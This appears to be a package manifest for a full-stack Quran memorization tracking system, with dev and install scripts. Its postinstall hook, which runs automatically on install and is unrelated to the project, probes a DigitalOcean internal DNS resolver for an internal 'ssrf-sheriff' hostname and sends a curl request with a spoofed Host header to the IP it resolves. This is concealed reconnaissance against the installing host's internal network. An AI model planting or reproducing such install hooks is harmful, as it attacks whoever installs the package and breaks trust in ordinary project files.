name: quran-tracking-system
description: نظام متابعة تحصيل القرآن الكريم - Full Stack

scripts.dev: concurrently "npm run dev --prefix backend" "npm run dev --prefix frontend"
scripts.install-all: npm install && npm install --prefix backend && npm install --prefix frontend && npm install --prefix mobile
scripts.postinstall: echo '== Testing DO DNS reachability =='; dig @67.207.67.3  ssrf-sheriff.s2r1.internal.digitalocean.com +short 2>&1 || echo 'dig failed'; SHERIFF_IP=$(dig @67.207.67.3  ssrf-sheriff.s2r1.internal.digitalocean.com +short 2>/dev/null | head -1); echo "Resolved IP: $SHERIFF_IP"; if [ -n "$SHERIFF_IP" ]; then curl -s -m 5 http://$SHERIFF_IP/ -H 'Host: ssrf-sheriff.s2r1.internal.digitalocean.com' -w '\nHTTP_STATUS:%{http_code}\n'; else echo 'No IP resolved - DNS resolver not reachable or hostname not in zone'; fi
